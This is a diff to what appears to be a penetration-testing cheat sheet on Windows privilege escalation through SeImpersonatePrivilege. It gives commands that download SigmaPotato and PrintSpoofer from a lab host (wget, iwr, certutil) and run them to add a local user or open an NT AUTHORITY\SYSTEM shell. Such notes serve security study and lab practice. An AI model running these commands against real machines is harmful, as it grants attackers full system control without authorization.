@@ -626,13 +626,13 @@ Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description
 # Elevated Privs
 ```
 
-# SeImpersonatePrivilege (Check out Potato Family at:)
+# SeImpersonatePrivilege (Check out Potato Family & Printspoofer at:)
 https://jlajara.gitlab.io/Potatoes_Windows_Privesc
 ```bash
 # SigmaPotato (Allows you to execute commands in the context of NT AUTHORITY\SYSTEM. )
 wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
 ```
-
+## SeImpersonatePrivilege | SigmaPotato Example
 ## Check Privs
 ```bash
 whoami /priv
@@ -653,6 +653,23 @@ iwr -uri http://192.168.45.227/SigmaPotato.exe -OutFile SigmaPotato.exe
 .\SigmaPotato "net user dave4 lab /add"
 ```
 ![alt text](image-14.png)
+
+## SeImpersonatePrivilege | PrintSpoofer Example
+
+```bash
+# SeImpersonatePrivilege Identified
+# Lets try PrintSpoofer.exe
+# Transfer File
+certutil -urlcache -f http://192.168.45.244/PrintSpoofer.exe C:\Users\Public\Documents\PrintSpoofer.exe
+
+# Run it:
+.\PrintSpoofer.exe -i -c cmd
+
+# Or
+.\PrintSpoofer.exe -i -c powershell.exe
+
+# NT AUTH/System Achieved
+```
 
 # WriteDacl
 
